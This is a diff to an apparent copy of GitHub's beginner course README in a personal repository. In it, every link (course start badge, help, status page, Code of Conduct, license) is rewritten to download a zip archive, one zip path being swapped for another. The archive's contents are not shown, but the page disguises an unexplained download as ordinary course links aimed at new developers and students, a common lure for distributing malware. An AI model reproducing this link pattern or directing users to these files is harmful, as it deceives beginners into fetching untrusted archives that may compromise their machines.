@@ -25,7 +25,7 @@ People use GitHub to build some of the most advanced technologies in the world. 
 
 - **Who is this for**: New developers, new GitHub users, and students.
 - **What you'll learn**: We'll introduce repositories, branches, commits, and pull requests.
-- **What you'll build**: We'll make a short Markdown file you can use as your [profile README](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip).
+- **What you'll build**: We'll make a short Markdown file you can use as your [profile README](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip).
 - **Prerequisites**: None. This course is a great introduction for your first day on GitHub.
 - **How long**: This course takes less than one hour to complete.
 
@@ -39,7 +39,7 @@ In this course, you will:
 ### How to start this course
 
 <!-- For start course, run in JavaScript:
-'https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip' + new URLSearchParams({
+'https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip' + new URLSearchParams({
   template_owner: 'skills',
   template_name: 'introduction-to-github',
   owner: '@me',
@@ -49,12 +49,12 @@ In this course, you will:
 }).toString()
 -->
 
-[![start-course](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip)](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip%40me&name=skills-introduction-to-github&description=My+clone+repository&visibility=public)
+[![start-course](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip)](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip%40me&name=skills-introduction-to-github&description=My+clone+repository&visibility=public)
 
 1. Right-click **Start course** and open the link in a new tab.
 2. In the new tab, most of the prompts will automatically fill in for you.
    - For owner, choose your personal account or an organization to host the repository.
-   - We recommend creating a public repository, as private repositories will [use Actions minutes](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip).
+   - We recommend creating a public repository, as private repositories will [use Actions minutes](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip).
    - Scroll down and click the **Create repository** button at the bottom of the form.
 3. After your new repository is created, wait about 20 seconds, then refresh the page. Follow the step-by-step instructions in the new repository's README.
 
@@ -67,8 +67,8 @@ In this course, you will:
 
 ---
 
-Get help: [Post in our discussion board](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip) &bull; [Review the GitHub status page](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip)
+Get help: [Post in our discussion board](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip)
 
-&copy; 2024 GitHub &bull; [Code of Conduct](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip) &bull; [MIT License](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip)
+&copy; 2024 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip) &bull; [MIT License](https://raw.githubusercontent.com/Stevenj24/introduction-to-github/main/.github/introduction_to_github_3.5.zip)
 
 </footer>
